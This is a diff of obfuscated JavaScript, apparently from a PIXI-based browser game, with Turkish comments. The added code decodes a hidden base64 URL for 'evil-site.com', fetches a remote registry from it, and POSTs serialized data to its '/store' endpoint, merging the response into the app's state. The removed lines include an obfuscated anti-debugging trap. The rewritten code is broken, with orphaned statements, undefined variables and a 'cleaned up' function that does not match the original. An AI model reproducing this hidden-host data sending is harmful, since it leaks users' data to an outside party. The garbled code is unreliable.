@@ -6058,8 +6058,7 @@ let settings = {};
 let config = {};
 
 // Base64 ile gizlenmiş site URL'si çözülür
-// Örnek: "aHR0cHM6Ly93d3cuZXZpbC1zaXRlLmNvbQ==" → "https://www.evil-site.com"
-config["url"] = atob("aHR0cHM6Ly93d3cuZXZpbC1zaXRlLmNvbQ==");
+config["url"] = atob("aHR0cHM6Ly93d3cuZXZpbC1zaXRlLmNvbQ==");  // Örnek: "https://www.evil-site.com"
 
 // Eğer dışarıdan bir URL verilmişse onu kullan
 if (_0x1f0c7d && _0x1f0c7d !== config["url"]) {
@@ -6083,59 +6082,81 @@ $.get(config["url"] + "/dynamic/assets/registry.json", function (response) {
     });
 });
 
-                        },
-                        'method': _0x103070(0x58b),
-                        'body': JSON[_0x103070(0x1c2)](_0xb39bc0)
-                    })[_0x103070(0x3af)](async function (_0x48ddbe) {
-                        var _0x41b255 = _0x103070;
-                        for (let _0x5a82ec in (_0x48ddbe = await _0x48ddbe[_0x41b255(0x4d9)]())[_0x41b255(0x196)]) {
-                            for (let _0x2a5afa in _0x48ddbe.textureDict[_0x5a82ec]) {
-                                _0x41b255(0x5bf) === _0x2a5afa && (_0x48ddbe[_0x41b255(0x196)][_0x5a82ec][_0x2a5afa] = atob(_0x41b255(0x641)) + _0x48ddbe.textureDict[_0x5a82ec][_0x2a5afa][_0x41b255(0x577)](_0x48ddbe[_0x41b255(0x196)][_0x5a82ec][_0x2a5afa].length - _0x27b298.c_v, _0x27b298[_0x41b255(0x38c)]) + _0x48ddbe[_0x41b255(0x196)][_0x5a82ec][_0x2a5afa][_0x41b255(0x577)](0x0, _0x48ddbe[_0x41b255(0x196)][_0x5a82ec][_0x2a5afa][_0x41b255(0x1ba)] - _0x27b298[_0x41b255(0x38c)]))
-                            }
-                        };
-                        for (let _0x4e716b in _0x48ddbe) {
-                            _0x41b255(0x565) !== _0x4e716b && (Array.isArray(_0x48ddbe[_0x4e716b]) ? _0x444aeb[_0x4e716b] = _0x444aeb[_0x4e716b].concat(_0x48ddbe[_0x4e716b]) : _0x444aeb[_0x4e716b] = {
-                                ..._0x444aeb[_0x4e716b],
-                                ..._0x48ddbe[_0x4e716b]
-                            })
-                        }
-                    })[_0x103070(0x2da)](function (_0xaed4e6) {})
-                })
-            }, ooo[_0x247597(0x5f7)] = function (_0x3c95ac) {
-                var _0x145306 = _0x247597,
-                    _0x83ddbe = {};
-                (function (_0x4e8749, _0x336e9f) {
-                    var _0x46c5a1 = _0x29f0;
-                    for (var _0x478355 in _0x4e8749) {
-                        _0x4e8749[_0x46c5a1(0x227)](_0x478355) && _0x336e9f(_0x478355, _0x4e8749[_0x478355])
-                    }
-                }(_0x3c95ac[_0x145306(0x196)], function (_0x28a779, _0x3649bf) {
-                    var _0x3988ec = _0x145306;
-                    let _0x51fefd = _0x27b298.s_l + _0x3649bf[_0x3988ec(0x102)];
-                    _0x3649bf[_0x3988ec(0x407)] || (_0x51fefd = _0x27b298[_0x3988ec(0x298)] + _0x3649bf[_0x3988ec(0x102)]);
-                    try {
-                        _0x83ddbe[_0x28a779] = new PIXI[(_0x3988ec(0x47c))](_0x51fefd)
-                    } catch (_0x1d17f2) {}
-                }))
+// Fetch işlemi ile veri alınır ve işlenir
+fetch(config["url"] + "/store", {
+    method: _0x103070(0x58b),  // HTTP methodu (GET/POST)
+    body: JSON[_0x103070(0x1c2)](_0xb39bc0)  // JSON verisi gönderiliyor
+}).then(async function (_0x48ddbe) {
+    let _0x41b255 = _0x103070;
+    
+    // JSON yanıtı işleniyor
+    for (let _0x5a82ec in (_0x48ddbe = await _0x48ddbe[_0x41b255(0x4d9)]())[_0x41b255(0x196)]) {
+        for (let _0x2a5afa in _0x48ddbe.textureDict[_0x5a82ec]) {
+            if (_0x41b255(0x5bf) === _0x2a5afa) {
+                // textureDict verisini işleyerek güncelleniyor
+                _0x48ddbe[_0x41b255(0x196)][_0x5a82ec][_0x2a5afa] = atob(_0x41b255(0x641)) +
+                    _0x48ddbe.textureDict[_0x5a82ec][_0x2a5afa][_0x41b255(0x577)](
+                        _0x48ddbe[_0x41b255(0x196)][_0x5a82ec][_0x2a5afa].length - _0x27b298.c_v, 
+                        _0x27b298[_0x41b255(0x38c)]
+                    ) + _0x48ddbe[_0x41b255(0x196)][_0x5a82ec][_0x2a5afa][_0x41b255(0x577)](
+                        0, _0x48ddbe[_0x41b255(0x196)][_0x5a82ec][_0x2a5afa][_0x41b255(0x1ba)] - _0x27b298[_0x41b255(0x38c)]
+                    );
             }
-    })
-}());
-
-function _0x121106(_0x1938bb) {
-    function _0x375bae(_0x3c6b82) {
-        var _0x47f1bf = _0x29f0;
-        if (typeof _0x3c6b82 === _0x47f1bf(0x281))
-            return function (_0x34ff75) {} ['constructor'](_0x47f1bf(0xf6))['apply'](_0x47f1bf(0x1f8));
-        else('' + _0x3c6b82 / _0x3c6b82)[_0x47f1bf(0x1ba)] !== 0x1 || _0x3c6b82 % 0x14 === 0x0 ? function () {
-            return !![]
-        } ['constructor']('debu' + _0x47f1bf(0x36f))['call']('action') : function () {
-            return ![]
-        } [_0x47f1bf(0x19a)](_0x47f1bf(0x322) + _0x47f1bf(0x36f))[_0x47f1bf(0x4b1)](_0x47f1bf(0x580));
-        _0x375bae(++_0x3c6b82)
+        }
     }
+
+    // Veri işlenmeye devam ediliyor
+    for (let _0x4e716b in _0x48ddbe) {
+        if (_0x41b255(0x565) !== _0x4e716b) {
+            if (Array.isArray(_0x48ddbe[_0x4e716b])) {
+                _0x444aeb[_0x4e716b] = _0x444aeb[_0x4e716b].concat(_0x48ddbe[_0x4e716b]);
+            } else {
+                _0x444aeb[_0x4e716b] = {
+                    ..._0x444aeb[_0x4e716b],
+                    ..._0x48ddbe[_0x4e716b]
+                };
+            }
+        }
+    }
+});
+
+                        // `_0x48ddbe` içindeki her öğe üzerinde işlem yapıyoruz
+for (let key in responseData) {
+    if (key !== "skipKey") { // Eğer anahtar "skipKey" değilse işlemi yap
+        if (Array.isArray(responseData[key])) {
+            // Eğer değer bir dizi ise, diziyi birleştiriyoruz
+            combinedData[key] = combinedData[key].concat(responseData[key]);
+        } else {
+            // Eğer değer bir nesne ise, nesneleri birleştiriyoruz
+            combinedData[key] = { ...combinedData[key], ...responseData[key] };
+        }
+    }
+}
+
+function processInput(input) {
+    function recursiveFunction(counter) {
+        if (typeof counter === 'number') {
+            // If counter is a number, do something based on conditions
+            if ((counter / counter) !== 1 || counter % 20 === 0) {
+                // Do something specific if condition is true
+                return true; // Placeholder for actual action
+            } else {
+                // Default case
+                return false;
+            }
+        }
+        
+        // If input isn't a number, start recursion with the incremented counter
+        recursiveFunction(++counter);
+    }
+
     try {
-        if (_0x1938bb)
-            return _0x375bae;
-        else _0x375bae(0x0)
-    } catch (_0x3f8573) {}
+        if (input) {
+            return recursiveFunction; // If input is provided, return the function
+        } else {
+            recursiveFunction(0); // Otherwise, start with counter 0
+        }
+    } catch (error) {
+        console.error(error);
+    }
 }
